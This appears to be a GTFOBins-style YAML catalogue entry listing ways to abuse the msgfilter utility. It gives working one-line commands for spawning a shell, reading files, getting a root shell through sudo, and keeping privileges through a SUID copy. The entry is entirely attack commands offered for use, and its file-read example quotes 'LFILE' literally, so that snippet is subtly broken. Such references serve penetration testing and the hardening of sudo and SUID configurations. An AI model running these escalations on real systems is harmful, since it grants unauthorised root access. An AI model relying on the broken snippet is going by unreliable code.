---
functions:
  shell:
    - description: Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
      code: |
        echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
  file-read:
    - description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.
      code: |
        LFILE=file_to_read
        msgfilter -P -i "LFILE" /bin/cat
  sudo:
    - description: Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
      code: |
        echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
  suid:
    - description: Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
      code: |
        echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
---
